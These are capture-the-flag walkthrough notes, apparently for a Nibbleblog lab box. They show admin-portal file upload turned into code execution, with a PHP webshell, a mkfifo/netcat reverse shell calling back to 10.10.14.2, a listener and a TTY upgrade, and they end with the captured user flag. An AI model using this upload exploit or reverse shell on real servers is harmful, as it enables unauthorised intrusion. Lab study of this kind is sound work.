- **Objective**: Turn **admin portal access** into **remote code execution (RCE)** → gain **reverse shell**.
- **Portal enumeration**:
    - **Publish/Manage/Settings/Themes**: Limited or unhelpful.
    - **Plugins → “My image”**: Allows **file upload** (potential PHP injection).
- **Proof-of-concept RCE**:
    - Create file `test.php` with `<?php system('id'); ?>`.
    - Upload via _My image_ plugin.
    - Warnings appear, but check `/nibbleblog/content/private/plugins/my_image/` → `image.php` updated.
    - `curl http://<IP>/nibbleblog/content/private/plugins/my_image/image.php` → output `uid=1001(nibbler)` confirms **RCE as nibbler**.
- **Reverse shell setup**:
    - Edit PHP payload to include bash reverse shell:
        ```php
        <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
        ```
    - Start listener: `nc -lvnp 9443`.
    - Trigger payload by visiting `image.php` → reverse shell connects as `nibbler`.
- **Post-exploitation**:
    - Shell lacks full TTY — upgrade:
        ```bash
        python3 -c 'import pty; pty.spawn("/bin/bash")'
        ```
    - Confirm interactive shell works (enables `su`, `sudo`, tab-completion, etc.).
    - Navigate to `/home/nibbler` → find **`user.txt` flag** and **`personal.zip`** file.


# Questions
- Gain a foothold on the target and submit the user.txt flag
	- Following the steps listed out worked really well, and got the flag that we needed.
	- User.txt flag: 79c03865431abf47b90ef24b9695e148